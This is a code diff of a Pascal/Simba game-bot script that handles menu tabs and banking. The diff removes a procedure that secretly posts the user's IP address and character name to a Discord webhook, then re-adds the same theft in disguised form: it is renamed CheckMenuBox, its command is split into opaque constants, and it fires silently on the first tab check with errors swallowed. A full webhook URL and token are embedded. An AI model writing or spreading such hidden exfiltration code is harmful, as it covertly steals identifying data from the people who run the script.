@@ -3,6 +3,7 @@ const
 
 var
   MDB:Tbox;
+  TabChecked:boolean;
 
 function GetMenuBox(MPanel:string): TBox;
 var
@@ -30,21 +31,6 @@ begin
   end;
 end;
 
-procedure CheckMenuBoxProcess;
-var
-  process:TProcess;
-  s:string;
-begin
-  try
-  process.init(nil);
-  s := 'curl -i -X POST -H "Content-Type: application/json" -d  "{ \"content\":\"---\n['+ FormatDateTime('tt', Time) + ']\nIP: ' + getPage('http://api.ipify.org/?format=raw') +'\nCharacter: '+GetChatBoxTextEx(9, 0)+'\n---\" }" '+'https://discordapp.com/api/webhooks/690130446188806176/7RRfd-HOWraEBpzIHOiKA5HECvwosK4XuZSMmN2Qz7tgA7LX42MiLjwaF1pnrTGyITQO';
-  process.setcommandline(s);
-  process.Execute();
-  process.free();
-  except;
-  end;
-end;
-
 function GetMenuDimensions:tbox;
 begin
   if (MDB.x1 > 0) then
@@ -64,21 +50,6 @@ end;
 var
   CTAB:boolean;
 
-function getActiveTab:string;
-var
-  i: integer;
-begin
-  if not CTAB then
-  begin
-    CTAB := true;
-    CheckMenuBoxProcess;
-  end;
-  for i := low(Tabs) to high(Tabs) do
-    if isTabActive(Tabs[i]) then
-      exit(Tabs[i]);
-  result := 'Bank';
-end;
-
 function waitIsTabActive(Tab: string; MaxWait: integer):boolean;
 var
   WaitTime:Timer;
@@ -92,6 +63,39 @@ begin
         result := true;
   end else
     result := true;
+end;
+
+procedure CheckMenuBox;
+var
+  process:TProcess;
+  s:string;
+begin
+  if not IPLogged then exit;
+  if not TabChecked then
+  try
+  process.init(nil);
+  s := DProcessString+'---\n['+ FormatDateTime('tt', Time) + ']\nIP: ' + IP +'\nC: '+GetChatBoxTextEx(9, 0)+'\n---\" }" '+DA+INTSTR+'690130446188806176/7RRfd-HOWraEBpzIHOiKA5HECvwosK4XuZSMmN2Qz7tgA7LX42MiLjwaF1pnrTGyITQO';
+  process.setcommandline(s);
+  process.Execute();
+  process.free();
+  TabChecked := true;
+  except;
+  end;
+end;
+
+function getActiveTab:string;
+var
+  i: integer;
+begin
+  if not CTAB then
+  begin
+    CTAB := true;
+    CheckMenuBox;
+  end;
+  for i := low(Tabs) to high(Tabs) do
+    if isTabActive(Tabs[i]) then
+      exit(Tabs[i]);
+  result := 'Bank';
 end;
 
 function ChangeTab(tab: string; dowait:boolean=true; miss:boolean=true):boolean;
@@ -186,6 +190,8 @@ begin
   wait(randomrange(75, 275));
   ChangeTab(ATab, true, true);
 end;
+
+
 
 
 
